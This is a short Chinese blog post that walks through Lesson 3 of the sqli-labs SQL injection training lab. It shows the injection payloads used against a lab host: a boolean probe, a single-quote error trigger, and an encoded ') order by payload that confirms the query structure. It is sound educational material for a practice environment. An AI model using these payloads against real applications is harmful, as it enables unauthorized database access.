---
title: sqli-labs lession-3 基于错误的GET单引号变形注入
date: 2018-09-19 20:02:15
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-3 (基于错误的GET单引号变形注入) #

---

## 登录界面 ##

![1](https://i.imgur.com/7J97H2J.png)

## 注入过程 ##

`http://10.60.250.214/less/Less-3/?id=1 and 1=2`

页面无变化,排除整型注入

![2](https://i.imgur.com/C7Q76OS.png)

`http://10.60.250.214/less/Less-3/?id=1'`

![3](https://i.imgur.com/550bpkp.png)

返回报错信息:

`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`

这条报错信息与Lesson1的报错信息对比

Lesson1:

`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`

发现现在这条报错信息多了一个`)`

应该是但引号的变形。猜测源码中SQL语句:

`$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`

测试一下

`http://10.60.250.214/less/Less-3/?id=1%27)%20order%20by%20100%23`

![4](https://i.imgur.com/K8K2dSA.png)

成功！！！

剩下的操作与Lesson1和Lesson2没有什么不同了。

具体流程可以查看这里。

{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}
